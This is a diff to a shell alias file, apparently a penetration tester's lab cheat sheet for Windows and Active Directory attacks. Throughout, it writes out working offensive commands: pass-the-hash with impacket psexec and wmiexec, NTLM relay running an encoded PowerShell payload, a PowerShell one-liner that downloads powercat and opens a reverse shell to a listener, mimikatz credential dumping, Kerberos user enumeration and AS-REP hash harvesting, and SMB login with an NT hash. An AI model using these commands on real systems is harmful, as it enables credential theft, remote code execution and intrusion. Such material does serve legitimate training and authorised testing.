@@ -34,7 +34,7 @@ alias hydra_httppostform='(){echo "hydra -l user -P /usr/share/wordlists/rockyou
 alias imp-psexec='impacket-psexec -hashes 00000000000000000000000000000000:"$1" "$username"@"$ip"' # $1 = NT Hash
 alias imp-wmiexec='impacket-wmiexec -hashes 00000000000000000000000000000000:"$1" "$username"@"$ip"' # $1 = NT Hash
 alias imp-ntlmrelayx='impacket-ntlmrelayx --no-http-server -smb2support -t "$ip" -c "powershell -enc JABjAGwAaQBlAG5...."' #dir \\192.168.119.2\test -> on tgt machine to catch hash
-alias impacket-mssqlclient "$username":"$1"@"$ip" -windows-auth # $1 = share name
+alias imp-mssqlclient='impacket-mssqlclient "$username":"$1"@"$ip" -windows-auth' # $1 = share name
 #alias mysql= -u root -p 'root' -h 192.168.50.16 -P 3306
 #alias powershell_oneliner='(){powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://$ip:8000/powercat.ps1');
 powercat -c 192.168.45.245 -p 4444 -e powershell"
@@ -43,8 +43,10 @@ alias ligolo_start='(){sudo ip tuntap add user `hostname` mode tun ligolo;sudo i
 alias ligolo_client_echo='(){echo "./agent -connect $LHOST:11601";echo "sudo ip route add _IP_ dev ligolo"}'
 alias ligolo_listeners_echo='(){echo "listener_add --addr 0.0.0.0:9001 --to 127.0.0.1:4444 --tcp";echo "listener_add --addr 0.0.0.0:9000 --to 127.0.0.1:4444 --tcp"}'
 alias ligolo_magicip='echo "Local Ligolo Agent IP = 240.0.0.1"'
+
 #### Mimikatz ####
 alias mimikatz_print='echo ".\mimikatz.exe \n privilege::debug \n sekurlsa::logonpasswords \n token::elevate \n lsadump::sam"'
+
 #### Get Usernames ####
 alias get_kerb_users_nmap="(){nmap -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm=''}" # realm=medtech.com
 #kerbrute= kerbrute bruteuser -d test.local passwords.txt john
@@ -68,13 +70,11 @@ aad3b435b51404eeaad3b435b51404ee
 #### Get Hashes ####
 alias getnpusers='(){python3 GetNPUsers.py test.local/ -dc-ip "$1" -usersfile usernames.txt -format hashcat -outputfile getnpusers_hashes.txt}`
 #### Found Hash #######
-alias smbhashlogin="(){echo 'smbclient \\\\$ip\\secrets -U Administrator --pw-nt-hash 7a38310ea6f0027ee955abed1762964b'}"
+alias smbhashlogin='smbclient \\\\$ip\\secrets -U Administrator --pw-nt-hash $HASH' # $HASH = nt hash
 #smbclient //server/share --directory path/to/directory -c 'get file.txt'
 #`net view \\\\dc01 /all`
 #### Pivoting ####
 # evil-winrm -i 10.10.10.1 -u john -H c23b2e293fa0d312de6f59fd6d58eae3
-
-
 ##### Runas #####
 EoP - Runas
 Use the cmdkey to list the stored credentials on the machine.
